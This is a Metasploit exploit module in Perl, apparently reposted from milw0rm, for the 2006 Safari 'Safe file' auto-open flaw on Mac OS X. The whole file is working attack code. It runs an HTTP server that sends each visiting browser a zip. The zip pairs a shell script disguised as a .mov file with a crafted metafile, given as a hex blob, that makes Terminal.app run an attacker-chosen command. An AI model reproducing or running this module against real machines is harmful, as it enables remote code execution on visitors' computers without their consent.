<html><head><title>Mac OS X Safari Browser (Safe File) Remote Code Execution Exploit</title></head><pre>
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::safari_safefiles_exec;

use strict;
use base &quot;Msf::Exploit&quot;;
use Pex::Text;
use IO::Socket::INET;
use IPC::Open3;
use FindBin qw{$RealBin};

 my $advanced =
  {
	'Gzip'       =&gt; [1, 'Enable gzip content encoding'],
	'Chunked'    =&gt; [1, 'Enable chunked transfer encoding'],
  };

my $info =
  {
	'Name'           =&gt; 'Safari Archive Metadata Command Execution',
	'Version'        =&gt; '$Revision: 1.3 $',
	'Authors'        =&gt;
	  [
		'H D Moore &lt;hdm [at] metasploit.com',
	  ],

	'Description'    =&gt;
	  Pex::Text::Freeform(qq{
		This module exploits a vulnerability in Safari's &quot;Safe file&quot; feature, which will
		automatically open any file with one of the allowed extensions. This can be abused
		by supplying a zip file, containing a shell script, with a metafile indicating
		that the file should be opened by Terminal.app. This module depends on
		the 'zip' command-line utility.
}),

	'Arch'           =&gt; [  ],
	'OS'             =&gt; [  ],
	'Priv'           =&gt; 0,

	'UserOpts'       =&gt;
	  {
		'HTTPPORT' =&gt; [ 1, 'PORT', 'The local HTTP listener port', 8080      ],
		'HTTPHOST' =&gt; [ 0, 'HOST', 'The local HTTP listener host', &quot;0.0.0.0&quot; ],
	  	'REALHOST' =&gt; [ 0, 'HOST', 'External address to use for redirects (NAT)' ],
	  },

	'Payload'        =&gt;
	  {
		'Space'     =&gt; 8000,
		'MinNops'   =&gt; 0,
		'MaxNops'   =&gt; 0,
		'Keys'     =&gt; ['cmd', 'cmd_bash'],
	  },
	'Refs'           =&gt;
	  [
		['URL', 'http://www.heise.de/english/newsticker/news/69862'],
		['BID', '16736'],
	  ],

	'DefaultTarget'  =&gt; 0,
	'Targets'        =&gt;
	  [
		[ 'Automatic' ]
	  ],

	'Keys'           =&gt; [ 'safari' ],

	'DisclosureDate' =&gt; 'Feb 21 2006',
  };

sub new {
	my $class = shift;
	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET-&gt;new(
		LocalHost =&gt; $self-&gt;GetVar('HTTPHOST'),
		LocalPort =&gt; $self-&gt;GetVar('HTTPPORT'),
		ReuseAddr =&gt; 1,
		Listen    =&gt; 1,
		Proto     =&gt; 'tcp'
	  );
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self-&gt;PrintLine(&quot;[-] Failed to create local HTTP listener on &quot; . $self-&gt;GetVar('HTTPPORT'));
		return;
	}

	my $httphost = $self-&gt;GetVar('HTTPHOST');
	$httphost = Pex::Utils::SourceIP('1.2.3.4') if $httphost eq '0.0.0.0';

	$self-&gt;PrintLine(&quot;[*] Waiting for connections to http://&quot;. $httphost .&quot;:&quot;. $self-&gt;GetVar('HTTPPORT') .&quot;/&quot;);

	while (defined($client = $server-&gt;accept())) {
		$self-&gt;HandleHttpClient(Msf::Socket::Tcp-&gt;new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd-&gt;PeerPort, $fd-&gt;PeerAddr);
		

	# Read the HTTP command
	my ($cmd, $url, $proto) = split(/ /, $fd-&gt;RecvLine(10), 3);
	my $agent;
	
	# Read in the HTTP headers
	while ((my $line = $fd-&gt;RecvLine(10))) {
		
		$line =~ s/^\s+|\s+$//g;
		
		my ($var, $val) = split(/\:/, $line, 2);

		# Break out if we reach the end of the headers
		last if (not defined($var) or not defined($val));

		$agent = $val if $var =~ /User-Agent/i;
	}

	my $target    = $self-&gt;Targets-&gt;[$self-&gt;GetVar('TARGET')];
	my $shellcode = $self-&gt;GetVar('EncodedPayload')-&gt;RawPayload;
	my $content   = $self-&gt;CreateZip($shellcode) || return;
	
	$self-&gt;PrintLine(&quot;[*] HTTP Client connected from $rhost:$rport, sending &quot;.length($shellcode).&quot; bytes of payload...&quot;);

	$fd-&gt;Send($self-&gt;BuildResponse($content));

	select(undef, undef, undef, 0.1);

	$fd-&gt;Close();
}

sub RandomHeaders {
	my $self = shift;
	my $head = '';

	while (length($head) &lt; 3072) {
		$head .= &quot;X-&quot; .
		  Pex::Text::AlphaNumText(int(rand(30) + 5)) . ': ' .
		  Pex::Text::AlphaNumText(int(rand(256) + 5))  .&quot;\r\n&quot;;
	}
	return $head;
}


sub BuildResponse {
	my ($self, $content) = @_;

	my $response =
	  &quot;HTTP/1.1 200 OK\r\n&quot; .
	  $self-&gt;RandomHeaders() .
	  &quot;Content-Type: application/zip\r\n&quot;;

	if ($self-&gt;GetVar('Gzip')) {
		$response .= &quot;Content-Encoding: gzip\r\n&quot;;
		$content = $self-&gt;Gzip($content);
	}
	if ($self-&gt;GetVar('Chunked')) {
		$response .= &quot;Transfer-Encoding: chunked\r\n&quot;;
		$content = $self-&gt;Chunk($content);
	} else {
		$response .= 'Content-Length: ' . length($content) . &quot;\r\n&quot; .
		  &quot;Connection: close\r\n&quot;;
	}

	$response .= &quot;\r\n&quot; . $content;

	return $response;
}

sub Chunk {
	my ($self, $content) = @_;

	my $chunked;
	while (length($content)) {
		my $chunk = substr($content, 0, int(rand(10) + 1), '');
		$chunked .= sprintf('%x', length($chunk)) . &quot;\r\n$chunk\r\n&quot;;
	}
	$chunked .= &quot;0\r\n\r\n&quot;;

	return $chunked;
}

sub Gzip {
	my $self = shift;
	my $data = shift;
	my $comp = int(rand(5))+5;

	my($wtr, $rdr, $err);

	my $pid = open3($wtr, $rdr, $err, 'gzip', '-'.$comp, '-c', '--force');
	print $wtr $data;
	close ($wtr);
	local $/;

	return (&lt;$rdr&gt;);
}

# Lame!
sub CreateZip {
	my $self = shift;
	my $cmds = shift;

	my $data = $cmds.&quot;\n&quot;;
	my $name = Pex::Text::AlphaNumText(int(rand(10)+4)).&quot;.mov&quot;;	
	my $temp = ($ENV{'HOME'} || $RealBin || &quot;/tmp&quot;) . &quot;/msf_safari_temp_&quot;.Pex::Text::AlphaNumText(16);
	
	if ($self-&gt;GotZip != 0) {
		$self-&gt;PrintLine(&quot;[*] Could not execute the zip command (or zip returned an error)&quot;);
		return;		
	}
	
	if (! mkdir($temp,0755)) {
		$self-&gt;PrintLine(&quot;[*] Could not create a temporary directory: $!&quot;);
		return;
	}
	
	if (! chdir($temp)) {
		$self-&gt;PrintLine(&quot;[*] Could not change into temporary directory: $!&quot;);
		$self-&gt;Nuke($temp);
		return;
	}
	
	if (! mkdir(&quot;$temp/__MACOSX&quot;,0755)) {
		$self-&gt;PrintLine(&quot;[*] Could not create the MACOSX temporary directory: $!&quot;);
		return $self-&gt;Nuke($temp);
		return;
	}
	
	if (! open(TMP, &quot;&gt;$temp/$name&quot;)) {
		$self-&gt;PrintLine(&quot;[*] Could not create the shell script: $!&quot;);
		$self-&gt;Nuke($temp);
		return;
	}
	
	print TMP $data;
	close(TMP);
	
	# This is important :)
	chmod(0755, &quot;$temp/$name&quot;);
	
	
	if (! open(TMP, &quot;&gt;$temp/__MACOSX/._&quot;.$name)) {
		$self-&gt;PrintLine(&quot;[*] Could not create the metafile: $!&quot;);
		$self-&gt;Nuke($temp);
		return;
	}
	
	print TMP $self-&gt;OSXMetaFile;
	close(TMP);
	
	system(&quot;zip&quot;, &quot;exploit.zip&quot;, $name, &quot;__MACOSX/._&quot;.$name);
	
	
	
	if( ! open(TMP, &quot;&lt;&quot;.&quot;exploit.zip&quot;)) {
		$self-&gt;PrintLine(&quot;[*] Failed to create exploit.zip (weird zip command?)&quot;);
		$self-&gt;Nuke($temp);
		return;
	}
	
	my $xzip;
	while (&lt;TMP&gt;) { $xzip .= $_ }
	close (TMP);
	
	$self-&gt;Nuke($temp);
	return $xzip;
}

sub Nuke {
	my $self = shift;
	my $temp = shift;
	system(&quot;rm&quot;, &quot;-rf&quot;, $temp);
	return;
}

sub GotZip {
	return system(&quot;zip -h &gt;/dev/null 2&gt;&amp;1&quot;);
}

sub OSXMetaFile {
	return 
		&quot;\x00\x05\x16\x07\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x09\x00\x00&quot;.
		&quot;\x00\x32\x00\x00\x00\x20\x00\x00\x00\x02\x00\x00\x00\x52\x00\x00&quot;.
		&quot;\x05\x3a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x01\x00\x00\x00\x05\x08\x00\x00\x04\x08\x00\x00&quot;.
		&quot;\x00\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x04\x04\x00\x00\x00\x25\x2f\x41\x70\x70\x6c\x69&quot;.
		&quot;\x63\x61\x74\x69\x6f\x6e\x73\x2f\x55\x74\x69\x6c\x69\x74\x69\x65&quot;.
		&quot;\x73\x2f\x54\x65\x72\x6d\x69\x6e\x61\x6c\x2e\x61\x70\x70\x00\xec&quot;.
		&quot;\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec&quot;.
		&quot;\xec\xec\xff\xec\xec\xec\xff\xe1\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1&quot;.
		&quot;\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1\xe1\xe1\xff\xe1&quot;.
		&quot;\xe1\xe1\xff\xe1\xe1\xe1\xff\xe6\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6&quot;.
		&quot;\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6\xe6\xe6\xff\xe6&quot;.
		&quot;\xe6\xe6\xff\xe6\xe6\xe6\xff\xe9\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9&quot;.
		&quot;\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9\xe9\xe9\xff\xe9&quot;.
		&quot;\xe9\xe9\xff\xe9\xe9\xe9\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec&quot;.
		&quot;\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec\xec\xec\xff\xec&quot;.
		&quot;\xec\xec\xff\xec\xec\xec\xff\xef\xef\xef\xff\xef\xef\xef\xff\xef&quot;.
		&quot;\xef\xef\xff\xef\xef\xef\xff\xef\xef\xef\xff\xef\xef\xef\xff\xef&quot;.
		&quot;\xef\xef\xff\xef\xef\xef\xff\xf3\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3&quot;.
		&quot;\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3\xf3\xf3\xff\xf3&quot;.
		&quot;\xf3\xf3\xff\xf3\xf3\xf3\xff\xf6\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6&quot;.
		&quot;\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6\xf6\xf6\xff\xf6&quot;.
		&quot;\xf6\xf6\xff\xf6\xf6\xf6\xff\xf8\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8&quot;.
		&quot;\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8\xf8\xf8\xff\xf8&quot;.
		&quot;\xf8\xf8\xff\xf8\xf8\xf8\xff\xfc\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc&quot;.
		&quot;\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc\xfc\xfc\xff\xfc&quot;.
		&quot;\xfc\xfc\xff\xfc\xfc\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff&quot;.
		&quot;\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff&quot;.
		&quot;\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff&quot;.
		&quot;\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff&quot;.
		&quot;\xff\xff\xff\xff\xff\xff\xa8\x00\x00\x00\xa8\x00\x00\x00\xa8\x00&quot;.
		&quot;\x00\x00\xa8\x00\x00\x00\xa8\x00\x00\x00\xa8\x00\x00\x00\xa8\x00&quot;.
		&quot;\x00\x00\xa8\x00\x00\x00\x2a\x00\x00\x00\x2a\x00\x00\x00\x2a\x00&quot;.
		&quot;\x00\x00\x2a\x00\x00\x00\x2a\x00\x00\x00\x2a\x00\x00\x00\x2a\x00&quot;.
		&quot;\x00\x00\x2a\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00&quot;.
		&quot;\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x03\x00&quot;.
		&quot;\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;.
		&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00&quot;.
		&quot;\x05\x08\x00\x00\x04\x08\x00\x00\x00\x32\x00\x5f\xd0\xac\x12\xc2&quot;.
		&quot;\x00\x00\x00\x1c\x00\x32\x00\x00\x75\x73\x72\x6f\x00\x00\x00\x0a&quot;.
		&quot;\x00\x00\xff\xff\x00\x00\x00\x00\x01\x0d\x21\x7c&quot;;
}
1;

# milw0rm.com [2006-02-22]</pre></html>